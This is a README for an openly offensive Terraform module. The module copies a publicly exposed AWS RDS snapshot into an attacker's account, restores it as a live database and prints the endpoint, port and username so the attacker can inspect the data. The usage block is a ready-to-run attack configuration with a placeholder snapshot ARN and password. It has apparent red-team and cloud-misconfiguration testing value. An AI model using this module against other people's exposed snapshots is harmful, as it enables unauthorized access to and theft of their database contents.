# AWS RDS Snapshot Publicly Exposed

![OffensiveTerraform](https://img.shields.io/badge/hack-success)
![OffensiveTerraform](https://img.shields.io/badge/offensive-terraform-blueviolet)
![OffensiveTerraform](https://img.shields.io/badge/aws-important)

Offensive Terraform module which creates RDS database from a publicly exposed RDS snapshot in attacker's AWS account. After that, attacker can connect to RDS database and inspect it.

![Attack Diagram](https://raw.githubusercontent.com/offensive-terraform/terraform-aws-rds-snapshot-publicly-exposed/master/diagram.jpg)

Note: The provider region must be same as publicly exposed RDS snapshot's region. 

## Usage
```
provider "aws" {
  region = "us-east-1"
}

module "rds-snapshot-publicly-exposed" {
    source  = "offensive-terraform/rds-snapshot-publicly-exposed/aws"

    rds_snapshot_arn = "arn:aws:rds:region:0000000000:snapshot:name"
    rds_db_password  = "password"
}

output "rds_endpoint" {
  value = module.rds-snapshot-publicly-exposed.rds_endpoint
}

output "rds_port" {
  value = module.rds-snapshot-publicly-exposed.rds_port
}

output "rds_username" {
  value = module.rds-snapshot-publicly-exposed.rds_username
}
```

## Author
Module managed by https://github.com/iganbold
